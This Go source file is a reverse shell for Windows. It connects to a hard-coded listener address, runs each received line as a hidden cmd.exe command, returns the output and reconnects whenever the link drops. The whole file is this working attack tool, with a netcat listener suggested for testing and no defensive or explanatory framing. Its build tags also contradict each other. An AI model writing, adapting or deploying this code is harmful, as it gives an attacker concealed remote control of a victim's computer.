// +build windows

//go:generate sh -c "CGO_ENABLED=0 go build -installsuffix netgo -tags netgo -ldflags \"-s -w -extldflags '-static'\" -o $DOLLAR(basename ${GOFILE} .go)`go env GOEXE` ${GOFILE}"
// +build !windows

// Reverse Windows CMD
// Test with nc -lvvp 12345
package main

import (
	"bufio"
	"net"
	"os/exec"
	"syscall"
	"time"
)

func main() {
	reverse("127.0.0.1:12345")
}

func reverse(host string) {
	c, err := net.Dial("tcp", host)
	if nil != err {
		if nil != c {
			c.Close()
		}
		time.Sleep(time.Minute)
		reverse(host)
	}

	r := bufio.NewReader(c)
	for {
		order, err := r.ReadString('\n')
		if nil != err {
			c.Close()
			reverse(host)
			return
		}

		// выполняем комманду сервера
		cmd := exec.Command("cmd", "/C", order)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, _ := cmd.CombinedOutput()

		c.Write(out)
	}
}
